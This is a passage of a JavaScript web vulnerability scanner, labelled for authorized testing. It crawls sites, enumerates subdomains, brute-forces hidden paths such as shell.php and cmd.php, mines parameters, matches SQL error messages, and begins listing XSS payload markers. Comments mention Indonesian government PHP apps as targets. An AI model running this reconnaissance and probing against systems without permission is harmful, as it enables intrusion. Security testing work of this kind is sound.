// CYBERHUNTER AI — OWASP Top 10 crawler + vulnerability scanner.
// Crawls same-origin pages, discovers injectable parameters (query, forms,
// headers, cookies), then runs active detection probes.
// IMPORTANT: intended for authorized security testing only.

import { promises as dns } from "node:dns";
import { isJsChallengePage, mergeCookieStrings, solveJsChallenge, CHROME_UA } from "./challenge.js";
import { scanCveSurface } from "./cve.js";

const UA = { "User-Agent": "CYBERHUNTER-Scanner/0.1 (authorized security audit)" };

const SECURITY_HEADERS = [
  { key: "content-security-policy", name: "Content-Security-Policy", owasp: "A05:2021 Security Misconfiguration", severity: "medium", desc: "Missing CSP allows XSS and data injection." },
  { key: "strict-transport-security", name: "Strict-Transport-Security", owasp: "A02:2021 Cryptographic Failures", severity: "high", desc: "Missing HSTS enables SSL stripping." },
  { key: "x-frame-options", name: "X-Frame-Options", owasp: "A05:2021 Security Misconfiguration", severity: "medium", desc: "Missing X-Frame-Options enables clickjacking." },
  { key: "x-content-type-options", name: "X-Content-Type-Options", owasp: "A05:2021 Security Misconfiguration", severity: "low", desc: "Missing header allows MIME-sniffing." },
  { key: "referrer-policy", name: "Referrer-Policy", owasp: "A01:2021 Broken Access Control", severity: "low", desc: "Missing Referrer-Policy may leak URL data." },
  { key: "permissions-policy", name: "Permissions-Policy", owasp: "A05:2021 Security Misconfiguration", severity: "low", desc: "Missing Permissions-Policy allows feature abuse." },
];

// NOTE: patterns must match actual DB error messages, not bare words like
// "mysql" — DVWA pages legitimately mention MySQL in footer/text.
const SQL_ERRORS = [
  /you have an error in your sql/i,
  /check the manual that corresponds to your (mysql|mariadb)/i,
  /near '[^']*' at line \d+/i,
  /mysql_fetch_array|mysqli?_fetch|mysql_query|mysqli?_query\(\)/i,
  /warning:\s*(mysqli?|mysql|pg_|sqlite|odbc)[^\n<]{0,80}/i,
  /fatal error:\s*(mysqli?|mysql|pg_|sqlite|odbc)/i,
  /unclosed quotation mark/i, /quoted string not properly terminated/i,
  /pg_query/i, /sqlite3?\.OperationalError|sqlite3?::?\w*error/i,
  /ora-\d{5}/i, /microsoft ole db|odbc driver/i, /sqlstate\[\d/i,
  /syntax error.*(sql|query)/i, /sql syntax.*error/i,
  // custom-app error prefixes seen on Indonesian gov PHP apps
  /illegal mix of collations/i, /query salah/i, /kesalahan (query|sql)/i,
  /error (number|no)[:\s#]*\d{3,}\b[^<]{0,120}(sql|query|mysql|database)/i,
];

const STATIC_EXT = /\.(css|js|mjs|map|png|jpe?g|gif|svg|webp|ico|woff2?|ttf|eot|pdf|zip|mp4|webm|json|xml|txt)(\?|#|$)/i;
// session-destructive endpoints must never be crawled — visiting them logs
// the user out (e.g. DVWA logout.php → dvwaLogout())
const SESSION_DESTRUCTIVE = /logout|signout|sign-out|logoff|log-out/i;
const REDIRECT_PARAM = /redirect|redirect_uri|url|next|return|continue|dest|destination|target|to|redir|goto|link|out|view|file|page|path|folder|pg|document|site|html|load|show|navigate|go|forward|callback/i;
const INJECTABLE_HEADERS = ["User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host", "X-Original-URL"];

const MAX_PAGES = 60;
const MAX_DEPTH = 4;
const MAX_PROBE_REQUESTS = 800;
const CRAWL_CONCURRENCY = 4;

async function fetchT(url, options = {}, ms = 10000) {
  const c = new AbortController();
  const t = setTimeout(() => c.abort(), ms);
  try {
    return await fetch(url, { ...options, signal: c.signal, redirect: "manual", headers: { ...UA, ...(options.headers || {}) } });
  } finally {
    clearTimeout(t);
  }
}

// fetchT + follow same-origin redirects (max hops). Returns final response.
// Cross-origin redirects are NOT followed (returned as-is).
async function fetchFollow(startUrl, options = {}, ms = 12000, maxHops = 4) {
  let url = startUrl;
  let res;
  for (let i = 0; i <= maxHops; i++) {
    res = await fetchT(url, options, ms);
    const loc = res.headers.get("location");
    if (![301, 302, 303, 307, 308].includes(res.status) || !loc) { res.finalUrl = url; return res; }
    let next;
    try { next = new URL(loc, url); } catch { res.finalUrl = url; return res; }
    if (next.origin !== new URL(url).origin) { res.finalUrl = url; return res; }
    url = next.toString();
    // 303/301 → GET
    if ([301, 302, 303].includes(res.status)) options = { ...options, method: "GET", body: null };
  }
  res.finalUrl = url;
  return res;
}

// Resolve the seed URL's redirect chain manually (any origin). Sites commonly
// bounce / → http://apex/home → https://www/home — fetchFollow only follows
// same-origin hops, so without this the scan stalls on an empty 302 page.
// Only adopts the final URL when it stays on the same site (www/apex equal).
async function resolveSeedRedirects(u, log, t0, authHeaders = {}) {
  const stripWww = (h) => h.replace(/^www\./i, "");
  const originHost = stripWww(u.hostname);
  const seedOrigin = u.origin;
  let cur = u;
  for (let i = 0; i < 6; i++) {
    let res;
    try {
      // send the session only to the seed origin — never leak it to a
      // different origin the redirect chain may hop through
      const h = { ...(authHeaders || {}) };
      try { if (new URL(cur).origin !== seedOrigin) delete h.Cookie; } catch { /* keep */ }
      res = await fetchT(cur.toString(), { headers: h }, 10000);
    } catch { return cur; }
    const loc = res.headers.get("location");
    if (![301, 302, 303, 307, 308].includes(res.status) || !loc) return cur;
    let next;
    try { next = new URL(loc, cur); } catch { return cur; }
    cur = next;
  }
  if (stripWww(cur.hostname) === originHost && cur.toString() !== u.toString()) {
    log?.(`[${t0?.() ?? "?"}s] Seed redirect resolved: ${u} → ${cur}`);
    return cur;
  }
  return u;
}

function finding(f) {
  return { id: crypto.randomUUID(), confidence: "high", recommendation: "", ...f };
}

function normalizeUrl(input) {
  let u = input.trim();
  if (!/^https?:\/\//i.test(u)) u = "https://" + u;
  return new URL(u);
}

// ---------- API endpoint discovery (JS fetch/xhr/axios + string literals) ----------

function extractApiEndpoints(pages, origin) {
  const found = new Map(); // url -> Set(methods)
  const add = (raw, method) => {
    try {
      const u = new URL(raw, origin);
      if (u.origin !== origin) return;
      u.hash = "";
      const key = u.toString();
      if (!found.has(key)) found.set(key, new Set());
      if (method) found.get(key).add(method.toUpperCase());
    } catch { /* ignore */ }
  };
  for (const p of pages) {
    const html = p.html ?? "";
    let m;
    // fetch('url' [, { method: 'POST' }]) — literal only; variable refs handled below
    const fetchRe = /fetch\(\s*['"`]([^'"`]+)['"`]([\s\S]{0,160}?)/gi;
    while ((m = fetchRe.exec(html))) {
      const meth = /method\s*:\s*['"`](\w+)['"`]/i.exec(m[2])?.[1];
      add(m[1], meth);
    }
    // xhr.open('METHOD', 'url')
    const xhrRe = /\.open\(\s*['"`](\w+)['"`]\s*,\s*['"`]([^'"`]+)['"`]/gi;
    while ((m = xhrRe.exec(html))) add(m[2], m[1]);
    // axios.get/post/put/patch/delete('url')
    const axiosRe = /axios\.(get|post|put|patch|delete)\(\s*['"`]([^'"`]+)['"`]/gi;
    while ((m = axiosRe.exec(html))) add(m[2], m[1]);
    // string literals that look like API paths (catches `const url = '/v2/user/'` + fetch(url))
    const strRe = /['"`](\/[^'"`\s]{2,120})['"`]/g;
    while ((m = strRe.exec(html))) {
      if (/\/(api|v\d+)\//i.test(m[1]) || /\/(api|v\d+)$/i.test(m[1])) add(m[1]);
    }
  }
  return [...found.entries()].map(([url, methods]) => ({ url, methods: [...methods] }));
}

// Light OpenAPI/Swagger parser — extracts path + HTTP method pairs from YAML or JSON specs.
function parseOpenApiSpec(text, specUrl, origin, endpoints) {
  const addEp = (path, method) => {
    try {
      const u = new URL(path, specUrl);
      if (u.origin !== origin) return;
      u.hash = "";
      endpoints.push({ url: u.toString(), methods: [method.toUpperCase()] });
    } catch { /* ignore */ }
  };
  try {
    const spec = JSON.parse(text);
    for (const [path, ops] of Object.entries(spec.paths ?? {})) {
      for (const meth of Object.keys(ops)) {
        if (/^(get|post|put|patch|delete)$/i.test(meth)) addEp(path, meth);
      }
    }
    return;
  } catch { /* not JSON — try YAML */ }
  // YAML: paths at 2-space indent, methods at 4-space indent
  const lines = text.split("\n");
  let currentPath = null;
  for (const line of lines) {
    const pm = /^ {2}(\/\S+):\s*$/.exec(line);
    if (pm) { currentPath = pm[1]; continue; }
    const mm = /^ {4}(get|post|put|patch|delete):\s*$/.exec(line);
    if (mm && currentPath) addEp(currentPath, mm[1]);
  }
}

// ---------- HTML parsing helpers ----------

// Crawl scope: default = exact origin; includeSubdomains extends to
// <base-domain> and all its subdomains (bug-bounty *.example.com scope).
function makeScope(startUrl, includeSubdomains) {
  const u = new URL(startUrl);
  const parts = u.hostname.toLowerCase().split(".");
  const baseHost = parts.length > 2 ? parts.slice(-2).join(".") : u.hostname.toLowerCase();
  return { origin: u.origin, baseHost, includeSubdomains: !!includeSubdomains };
}
function inScope(u, scope) {
  if (!scope.includeSubdomains) return u.origin === scope.origin;
  const h = u.hostname.toLowerCase();
  return h === scope.baseHost || h.endsWith("." + scope.baseHost);
}

// ---------- subdomain enumeration (bug bounty) ----------
// Sources: crt.sh certificate-transparency logs + a small DNS wordlist.
// No external tooling required — uses Node's dns + crt.sh JSON API.
const SUBDOMAIN_WORDLIST = [
  "www", "api", "app", "dev", "staging", "stage", "test", "admin", "portal",
  "blog", "shop", "mail", "cdn", "static", "assets", "beta", "demo", "sandbox",
  "internal", "intranet", "vpn", "git", "jenkins", "ci", "monitor", "grafana",
  "kibana", "status", "docs", "support", "help", "secure", "auth", "sso", "id",
  "accounts", "pay", "payment", "billing", "dashboard", "panel", "console",
  "crm", "erp", "hr", "wiki", "jira", "confluence", "gitlab", "github",
  "bitbucket", "registry", "graphql", "ws", "socket", "realtime", "m", "mobile",
  "web", "webapp", "frontend", "backend", "server", "db", "database", "backup",
  "old", "new", "legacy", "vps", "cloud", "k8s", "docker", "vault", "keycloak",
];

async function enumerateSubdomains(domain, log, t0) {
  const subs = new Set([domain]);
  // 1) crt.sh — certificate transparency logs reveal real subdomains
  try {
    const r = await fetch(`https://crt.sh/?q=%25.${encodeURIComponent(domain)}&output=json`, {
      headers: { "User-Agent": UA["User-Agent"] }, signal: AbortSignal.timeout(15000),
    });
    if (r.ok) {
      const data = await r.json();
      for (const e of Array.isArray(data) ? data : []) {
        for (const n of String(e.name_value ?? "").split("\n")) {
          const h = n.trim().toLowerCase().replace(/^\*\./, "");
          if (h === domain || h.endsWith("." + domain)) subs.add(h);
        }
      }
    }
  } catch { /* crt.sh unreachable — DNS brute still runs */ }
  // 2) DNS brute-force over common subdomain names
  await Promise.all(SUBDOMAIN_WORDLIST.map(async (w) => {
    const h = `${w}.${domain}`;
    try { await dns.resolve4(h); subs.add(h); } catch { /* NXDOMAIN */ }
  }));
  const list = [...subs].slice(0, 40);
  log(`[${t0()}s] [RECON] Subdomain enumeration: ${list.length} host(s) found for ${domain}`);
  return list;
}

function extractLinks(html, baseUrl, scope) {
  const links = new Set();
  const re = /(?:href|src|action)=["']([^"']+)["']/gi;
  let m;
  while ((m = re.exec(html))) {
    // decode HTML entities — href="...?a=1&amp;b=2" must parse as two params,
    // not one param literally named "amp;b"
    const raw = m[1].trim().replace(/&amp;/gi, "&");
    if (/^(mailto:|tel:|javascript:|data:|#)/i.test(raw)) continue;
    try {
      const u = new URL(raw, baseUrl);
      if (!inScope(u, scope)) continue;
      if (STATIC_EXT.test(u.pathname)) continue;
      if (SESSION_DESTRUCTIVE.test(u.pathname)) continue;
      u.hash = "";
      links.add(u.toString());
    } catch { /* ignore */ }
  }
  return [...links];
}

function extractParams(html, baseUrl) {
  const params = new Set();
  const hrefRe = /href=["']([^"']*\?[^"']+)["']/gi;
  let m;
  while ((m = hrefRe.exec(html))) {
    try {
      const u = new URL(m[1].replace(/&amp;/gi, "&"), baseUrl);
      for (const k of u.searchParams.keys()) params.add(k);
    } catch { /* ignore */ }
  }
  const inputRe = /<input[^>]+name=["']([^"']+)["'][^>]*>/gi;
  while ((m = inputRe.exec(html))) {
    if (/type=["']?(hidden|text|search)/i.test(m[0])) params.add(m[1]);
  }
  // <select>/<textarea>/<button name> are injectable params too — input-only
  // regexes miss them entirely
  const otherRe = /<(?:select|textarea|button)[^>]*?name=["']([^"']+)["']/gi;
  while ((m = otherRe.exec(html))) params.add(m[1]);
  return [...params];
}

function extractForms(html, baseUrl, scope) {
  const forms = [];
  const formRe = /<form[\s\S]*?<\/form>/gi;
  let fm;
  while ((fm = formRe.exec(html))) {
    const block = fm[0];
    const openTag = /<form[^>]*>/i.exec(block)?.[0] ?? "";
    const action = /action=["']([^"']*)["']/i.exec(openTag)?.[1] ?? "";
    const method = (/method=["']([^"']*)["']/i.exec(openTag)?.[1] ?? "get").toLowerCase() === "post" ? "post" : "get";
    let actionUrl;
    try { actionUrl = new URL(action || baseUrl, baseUrl); } catch { continue; }
    if (!inScope(actionUrl, scope)) continue;
    const fields = [];
    const inRe = /<input[^>]*>/gi;
    let im;
    while ((im = inRe.exec(block))) {
      const tag = im[0];
      const name = /name=["']([^"']+)["']/i.exec(tag)?.[1];
      const type = (/type=["']([^"']+)["']/i.exec(tag)?.[1] ?? "text").toLowerCase();
      const value = /value=["']([^"']*)["']/i.exec(tag)?.[1] ?? (type === "submit" ? name : "");
      if (name && type !== "password") {
        fields.push({ name, value: value || "1", type });
      }
    }
    // <select>/<textarea> carry injectable values just like inputs
    const stRe = /<(?:select|textarea)[^>]*?name=["']([^"']+)["'][^>]*>/gi;
    let sm;
    while ((sm = stRe.exec(block))) {
      fields.push({ name: sm[1], value: "1", type: "text" });
    }
    const uniq = [...new Map(fields.map((f) => [f.name, f])).values()];
    // probe targets exclude submit/button/image/file; hidden fields ARE probed
    // unless they look like CSRF/anti-forgery tokens (probing those just
    // invalidates the form and adds noise)
    const CSRF_LIKE = /token|csrf|nonce|authenticity|checksum|signature|_token/i;
    const probeable = uniq.filter((f) =>
      !["submit", "button", "image", "file"].includes(f.type) &&
      (f.type !== "hidden" || !CSRF_LIKE.test(f.name)));
    forms.push({ url: actionUrl.toString(), method, params: probeable.map((f) => f.name), fields: uniq });
  }
  return forms.slice(0, 8);
}

// File-download heuristic: a link is an "asset" when its path ends in a static
// extension OR any query param VALUE ends in one (e.g. ?ket=Laporan.pdf).
// These endpoints return files, not pages — crawling them wastes the page
// budget and hours of request time, but their params are still injectable.
const FILE_EXT = /\.(pdf|zip|rar|7z|docx?|xlsx?|pptx?|jpe?g|png|gif|webp|mp[34]|csv|txt|json|xml)([?#].*)?$/i;
function isAssetUrl(raw) {
  try {
    const u = new URL(raw);
    if (FILE_EXT.test(u.pathname)) return true;
    for (const v of u.searchParams.values()) if (FILE_EXT.test(v)) return true;
    return false;
  } catch { return false; }
}
function assetSig(raw) {
  try {
    const u = new URL(raw);
    const names = [...new Set(u.searchParams.keys())].sort().join(",");
    return `${u.pathname}|${names}`;
  } catch { return raw; }
}

// ---------- crawler ----------

async function crawl(startUrl, log, t0, ftF, concurrency = CRAWL_CONCURRENCY, maxPages = MAX_PAGES, maxDepth = MAX_DEPTH, includeSubdomains = false, extraSeeds = []) {
  const scope = makeScope(startUrl, includeSubdomains);
  const origin = scope.origin;
  const seeds = [startUrl, ...extraSeeds];
  const visited = new Set(seeds);
  const queue = seeds.map((u) => ({ url: u, depth: 0 }));
  const pages = [];
  const allParams = new Set();
  const forms = [];
  const cookies = new Set();
  // file-download endpoints: skip fetching, keep one representative per
  // (path + param-name) signature so their params still get probed later
  const assetSigs = new Map();

  while (queue.length && pages.length < maxPages) {
    const batch = queue.splice(0, concurrency);
    const results = await Promise.all(batch.map(async ({ url, depth }) => {
      try {
        const res = await ftF(url, {}, 8000);
        const ctype = res.headers.get("content-type") ?? "";
        if (!ctype.includes("text/html")) return { url, depth, html: null, res };
        const html = await res.text();
        return { url, depth, html, res };
      } catch {
        return { url, depth, html: null, res: null };
      }
    }));

    for (const r of results) {
      if (r.html == null) continue;
      const pageUrl = r.res?.finalUrl ?? r.url;
      pages.push({ ...r, url: pageUrl });
      log(`[${t0()}s] Crawled: ${pageUrl} (${r.html.length}b, depth ${r.depth})`);

      for (const k of new URL(pageUrl).searchParams.keys()) allParams.add(k);
      for (const p of extractParams(r.html, pageUrl)) allParams.add(p);
      for (const f of extractForms(r.html, pageUrl, scope)) {
        forms.push(f);
        for (const p of f.params) allParams.add(p);
      }
      for (const c of r.res?.headers.getSetCookie?.() ?? []) {
        const name = c.split("=")[0].trim();
        if (name) cookies.add(name);
      }

      if (r.depth < maxDepth) {
        for (const link of extractLinks(r.html, pageUrl, scope)) {
          if (visited.has(link)) continue;
          visited.add(link);
          if (isAssetUrl(link)) {
            const sig = assetSig(link);
            if (!assetSigs.has(sig)) {
              assetSigs.set(sig, link);
              try { for (const k of new URL(link).searchParams.keys()) allParams.add(k); } catch { /* ignore */ }
            }
            continue; // don't spend crawl budget fetching file downloads
          }
          queue.push({ url: link, depth: r.depth + 1 });
        }
      }
    }
    log(`[${t0()}s] Crawl progress: ${pages.length} page(s), ${visited.size} discovered, ${allParams.size} params`);
  }

  // Harvest probe surface from skipped download endpoints — one synthetic
  // page per unique signature keeps id/ket/file params in buildTargets.
  for (const [, u] of [...assetSigs].slice(0, 80)) {
    pages.push({ url: u, depth: -1, html: "", res: null, asset: true });
  }
  if (assetSigs.size) log(`[${t0()}s] Skipped ${assetSigs.size} file-download URL(s) — params kept for probing`);
  log(`[${t0()}s] Crawl finished: ${pages.length} pages indexed, ${allParams.size} unique parameters, ${forms.length} forms, ${cookies.size} cookies`);
  return { pages, params: [...allParams], forms, cookies: [...cookies] };
}

// ---------- hidden endpoint discovery ----------
// Crawlers only follow <a href> links — endpoints referenced by JS, emails,
// hardcoded redirects, or unlinked admin panels stay invisible. A small
// wordlist of GET requests surfaces them so their params reach buildTargets.
const HIDDEN_PATH_WORDLIST = [
  "redirect.php", "url.php", "go.php", "out.php", "link.php", "r.php",
  "jump.php", "away.php", "exit.php", "forward.php", "redir.php",
  "return.php", "next.php", "dest.php", "continue.php", "target.php",
  "to.php", "view.php", "fetch.php", "proxy.php",
  "redirect", "redirect/", "goto", "goto/",
  "login.php", "admin/", "admin.php", "administrator/", "panel/",
  "config.php", "configuration.php", "settings.php",
  "phpinfo.php", "info.php", "test.php", "demo.php", "upload.php",
  "api/", "api.php", "graphql", "graphql/",
  "server-status", "server-info",
  "env.php", "backup/", "db/", "dump.php", "shell.php", "cmd.php",
  "console/", "dashboard/", "account/", "profile.php", "search.php",
  // common PHP-app filenames — gov/CMS apps expose cetak/unduh/detail/cari
  // endpoints that are rarely linked directly (print views, downloaders)
  "cetak.php", "cetak/", "cetak/cetak.php", "cetak/info.php", "cetak/print.php",
  "detail.php", "cari.php", "search.php", "view.php", "show.php",
  "download.php", "unduh.php", "export.php", "print.php",
  "daftar.php", "list.php", "data.php", "laporan.php", "berita.php",
  "artikel.php", "pengumuman.php", "dokumen.php", "file.php", "berkas.php",
  "profil.php", "tentang.php", "kontak.php", "sitemap.php",
  "edit.php", "hapus.php", "delete.php", "update.php", "simpan.php",
  "tambah.php", "input.php", "form.php", "proses.php", "aksi.php",
  "ajax.php", "get.php", "load.php", "fetch.php", "api.php",
  "index.php", "home.php", "main.php", "menu.php",
];
// shorter list probed inside each discovered subdirectory (cetak/, user/…)
const HIDDEN_SUBDIR_WORDLIST = [
  "index.php", "cetak.php", "cetakinfo.php", "info.php", "print.php",
  "detail.php", "view.php", "cari.php", "search.php", "download.php",
  "unduh.php", "export.php", "list.php", "data.php", "laporan.php",
  "berita.php", "artikel.php", "dokumen.php", "file.php", "profil.php",
  "edit.php", "hapus.php", "delete.php", "tambah.php", "form.php",
];
const REDIRECT_LIKE_PATH = /redirect|goto|rdir|return|next|dest|continue|target|url\.php|out\.php|away|exit|forward|link\.php|to\.php|redir\.php/i;
const COMMON_REDIRECT_PARAMS = ["url", "next", "redirect", "redir", "return", "goto", "dest", "target", "continue", "returnTo", "returnUrl", "rurl", "out", "to"];

// Content signature for soft-404 / catch-all detection: strip scripts, styles
// and per-request nonces so interstitial/404 pages that differ only in
// generated tokens still compare equal.
function pageSignature(html) {
  return String(html ?? "")
    .replace(/<script[\s\S]*?<\/script>/gi, "")
    .replace(/<style[\s\S]*?<\/style>/gi, "")
    .replace(/\s+nonce="[^"]*"/gi, "")
    .replace(/\s+/g, " ")
    .trim();
}

function isSameAsBaseline(sig, baselineSig, htmlLen, baseLen) {
  if (!baselineSig) return false;
  if (sig === baselineSig) return true;
  // near-identical length + identical leading structure → same template page
  return baseLen > 0 && Math.abs(htmlLen - baseLen) / baseLen < 0.08
    && sig.slice(0, 400) === baselineSig.slice(0, 400);
}

async function discoverHiddenEndpoints(baseUrl, ftF, log, t0, knownUrls, subDirs = []) {
  const found = [];
  // Resolve against the app root, not the bare origin: for apps installed under
  // a subdirectory (/DVWA/) this keeps discovery inside the app instead of
  // hitting unrelated services on the same host. The app root is the first
  // path segment — a seed deep inside (/DVWA/vuln/brute/) still maps to /DVWA/.
  const base = new URL(baseUrl);
  const segs = base.pathname.split("/").filter(Boolean);
  base.pathname = segs.length > 1 ? `/${segs[0]}/` : (base.pathname.endsWith("/") ? base.pathname : `/${segs[0] ?? ""}/`);
  // Baseline: fetch a guaranteed-missing path. Sites with soft-404/catch-all
  // routing return the homepage (or a custom 404) with HTTP 200 for EVERY
  // path — without this filter the whole wordlist becomes fake "endpoints"
  // and floods the probe budget.
  let baselineSig = "", baselineLen = 0;
  try {
    const sentinel = new URL(`cyberhunter-404-${Date.now().toString(36)}.html`, base).toString();
    const br = await ftF(sentinel, {}, 8000);
    if (br.status === 200) {
      const btext = await br.text();
      baselineSig = pageSignature(btext);
      baselineLen = btext.length;
    }
  } catch { /* no baseline — accept all candidates */ }
  const candidates = HIDDEN_PATH_WORDLIST.map((p) => new URL(p, base).toString());
  // probe the short PHP filename list inside each discovered subdirectory —
  // apps keep print/download/report scripts under /cetak/, /user/, /admin/
  // that the root wordlist can never reach
  for (const d of subDirs.slice(0, 8)) {
    for (const p of HIDDEN_SUBDIR_WORDLIST) {
      try { candidates.push(new URL(`${d.replace(/\/?$/, "/")}${p}`, base).toString()); } catch { /* ignore */ }
    }
  }
  for (let i = 0; i < candidates.length; i += 4) {
    const batch = candidates.slice(i, i + 4);
    const results = await Promise.all(batch.map(async (u) => {
      if (knownUrls.has(u)) return null;
      try {
        const r = await ftF(u, {}, 8000);
        const ctype = r.headers.get("content-type") ?? "";
        if (r.status !== 200 || !ctype.includes("text/html")) return null;
        const html = await r.text();
        if (html.length < 200) return null;
        if (isSameAsBaseline(pageSignature(html), baselineSig, html.length, baselineLen)) return null;
        return { url: r.finalUrl ?? u, html, res: r };
      } catch { return null; }
    }));
    for (const p of results) {
      if (!p || knownUrls.has(p.url)) continue;
      knownUrls.add(p.url);
      // Redirect-like endpoints get synthetic param URLs so the open-redirect
      // probe has targets even though no link exposes the param names.
      try {
        const u = new URL(p.url);
        if (REDIRECT_LIKE_PATH.test(u.pathname)) {
          for (const k of COMMON_REDIRECT_PARAMS) if (!u.searchParams.has(k)) u.searchParams.set(k, "cyberhunter");
          p.url = u.toString();
        }
      } catch { /* keep original */ }
      found.push(p);
      log(`[${t0()}s] [RECON] Hidden endpoint found: ${p.url} (${p.html.length}b)`);
    }
  }

  // Filename mutation: apps cluster scripts by prefix (cetakinfo.php,
  // cetakinfobaru.php, cetakinfoskpd.php…). For every discovered .php file,
  // try appending common suffixes — this reaches files no wordlist contains.
  const PHP_SUFFIXES = [
    "skpd", "user", "admin", "pub", "publik", "baru", "detail", "print",
    "diteruskan", "dibalas", "keberatan", "semua", "all", "export",
    "download", "unduh", "view", "list", "data", "info", "cetak", "pdf", "excel",
  ];
  const mutSeen = new Set();
  const mutCandidates = [];
  for (const ku of [...knownUrls]) {
    try {
      const u = new URL(ku);
      const m = u.pathname.match(/^(.*\/)([A-Za-z0-9_-]+)\.php$/i);
      if (!m) continue;
      const stem = m[2].toLowerCase();
      for (const s of PHP_SUFFIXES) {
        if (stem.endsWith(s)) continue;
        const cand = `${m[1]}${m[2]}${s}.php`;
        if (!knownUrls.has(new URL(cand, u.origin).toString()) && !mutSeen.has(cand)) {
          mutSeen.add(cand);
          mutCandidates.push(new URL(cand, u.origin).toString());
        }
      }
    } catch { /* ignore */ }
  }
  for (let i = 0; i < mutCandidates.length && i < 240; i += 4) {
    const batch = mutCandidates.slice(i, i + 4);
    const results = await Promise.all(batch.map(async (u) => {
      try {
        const r = await ftF(u, {}, 8000);
        const ctype = r.headers.get("content-type") ?? "";
        if (r.status !== 200 || !ctype.includes("text/html")) return null;
        const html = await r.text();
        if (html.length < 200) return null;
        if (isSameAsBaseline(pageSignature(html), baselineSig, html.length, baselineLen)) return null;
        return { url: r.finalUrl ?? u, html, res: r };
      } catch { return null; }
    }));
    for (const p of results) {
      if (!p || knownUrls.has(p.url)) continue;
      knownUrls.add(p.url);
      found.push(p);
      log(`[${t0()}s] [RECON] Filename mutation found: ${p.url} (${p.html.length}b)`);
    }
  }
  return found;
}

// ---------- parameter mining ----------
// Endpoints discovered without any query string may still accept parameters
// nobody linked (cetakinfoskpd.php?datatcari=…). Probe a common param-name
// list one at a time and keep names that change the response: different
// status, >12% body-size delta, a SQL error, or reflection of the canary.
const COMMON_PARAM_NAMES = [
  "id", "idinfo", "iddetail", "pid", "cid", "uid", "nid", "kode", "kd", "no", "nomor",
  "page", "hal", "halaman", "p", "cat", "kategori", "thn", "tahun", "bulan", "tgl", "tanggal",
  "search", "q", "keyword", "cari", "datatcari", "keyword", "find", "query",
  "filter", "sort", "order", "type", "mode", "act", "action", "task", "op", "do",
  "file", "dokumen", "berkas", "lampiran", "unduh", "download", "cetak", "print", "export",
  "view", "detail", "profil", "user", "nama", "key", "token", "ref", "src", "img",
  "itemid", "option", "module", "slug", "skpd", "nip", "kd_skpd", "periode", "status",
];
const INTERESTING_PATH = /cetak|unduh|download|cari|search|detail|view|show|profil|user|admin|skpd|api|list|data|laporan|berita|artikel|form|print|export|dokumen|file|berkas/i;

async function mineQueryParams(pages, ftF, log, t0, maxRequests = 350) {
  const mined = [];
  // candidate endpoints: no query string at all, deduped by pathname,
  // interesting paths first
  const byPath = new Map();
  for (const p of pages) {
    try {
      const u = new URL(p.url);
      if (u.search) continue;
      if (!byPath.has(u.pathname)) byPath.set(u.pathname, u.toString().replace(/\/$/, "") || u.origin + "/");
    } catch { /* ignore */ }
  }
  const candidates = [...byPath.entries()]
    .sort((a, b) => (INTERESTING_PATH.test(b[0]) ? 1 : 0) - (INTERESTING_PATH.test(a[0]) ? 1 : 0))
    .slice(0, 30)
    .map(([, u]) => u);
  let reqs = 0;
  const CANARY = "cyberhunter_probe_7f3a";
  for (const base of candidates) {
    if (reqs >= maxRequests) break;
    let baseStatus = 0, baseLen = 0, baseText = "";
    try {
      const br = await ftF(base, {}, 8000);
      baseStatus = br.status;
      baseText = await br.text();
      baseLen = baseText.length;
      reqs++;
      if (baseStatus >= 400 || baseLen < 100) continue;
    } catch { continue; }
    for (const name of COMMON_PARAM_NAMES) {
      if (reqs >= maxRequests) break;
      try {
        const u = new URL(base);
        u.searchParams.set(name, CANARY);
        const r = await ftF(u.toString(), {}, 8000);
        const text = await r.text();
        reqs++;
        const lenDelta = Math.abs(text.length - baseLen) / Math.max(baseLen, 1);
        const interesting =
          r.status !== baseStatus ||
          lenDelta > 0.12 ||
          SQL_ERRORS.some((re) => re.test(text)) ||
          text.includes(CANARY);
        if (interesting) {
          mined.push({ url: u.toString(), param: name, status: r.status, lenDelta: +lenDelta.toFixed(3) });
          log(`[${t0()}s] [RECON] Param mined: ${name} on ${u.pathname} (status ${r.status}, size ${text.length}b vs ${baseLen}b)`);
        }
      } catch { /* ignore */ }
    }
  }
  return mined;
}

// Mine same-origin .js bundles for endpoints and param names that never
// appear in HTML: fetch('/api/x.php?a=1'), axios calls, route tables.
// Returns pseudo-pages so buildTargets probes their query params like any
// crawled page.
async function mineJsSurface(pages, origin, ftF, log, t0, maxAssets = 15) {
  const assets = new Set();
  for (const p of pages) {
    for (const m of (p.html ?? "").matchAll(/<script[^>]+src=["']([^"']+)["']/gi)) {
      try {
        const u = new URL(m[1], p.url);
        if (u.origin === origin && /\.m?js(\?|#|$)/i.test(u.pathname)) assets.add(u.toString());
      } catch { /* ignore */ }
    }
  }
  const found = [];
  const seen = new Set();
  for (const a of [...assets].slice(0, maxAssets)) {
    try {
      const r = await ftF(a, {}, 8000);
      const ctype = r.headers.get("content-type") ?? "";
      if (!/javascript|text|octet-stream/i.test(ctype)) continue;
      const text = await r.text();
      // quoted strings that look like same-origin URLs containing a query
      for (const m of text.matchAll(/["'`]([^"'`\s]*\?[^"'`\s]+)["'`]/g)) {
        try {
          const u = new URL(m[1], a);
          u.hash = "";
          if (u.origin !== origin || STATIC_EXT.test(u.pathname) || SESSION_DESTRUCTIVE.test(u.pathname)) continue;
          if (seen.has(u.toString())) continue;
          seen.add(u.toString());
          found.push({ url: u.toString(), depth: -1, html: "", res: null, jsDiscovered: true });
        } catch { /* ignore */ }
      }
      // bare relative endpoints: '/cetak/cetakinfo.php' without query — record
      // the path so param mining can try common param names on it
      for (const m of text.matchAll(/["'`](\/[A-Za-z0-9_./-]+\.php)["'`]/g)) {
        try {
          const u = new URL(m[1], a);
          if (u.origin !== origin || u.search || STATIC_EXT.test(u.pathname)) continue;
          const bare = u.toString().replace(/\/$/, "");
          if (seen.has(bare)) continue;
          seen.add(bare);
          found.push({ url: bare, depth: -1, html: "", res: null, jsDiscovered: true });
        } catch { /* ignore */ }
      }
    } catch { /* skip asset */ }
  }
  if (found.length) log(`[${t0()}s] [RECON] JS mining: ${found.length} endpoint(s) from ${Math.min(assets.size, maxAssets)} bundle(s)`);
  return found;
}

// ---------- probes ----------

// Only tag-based markers count as XSS evidence — plain-text reflections like
// "javascript:alert(1)" or attribute fragments are inert without a tag/handler context.
// Case-insensitive regexes so WAF-evasion case-mixing (<SvG/OnLoAd=...>) still matches.
const XSS_RES = [
  /cyberhunter<svg\/onload=alert\(1\)>/i,
  /cyberhunter<img src=x onerror=alert\(1\)>/i,
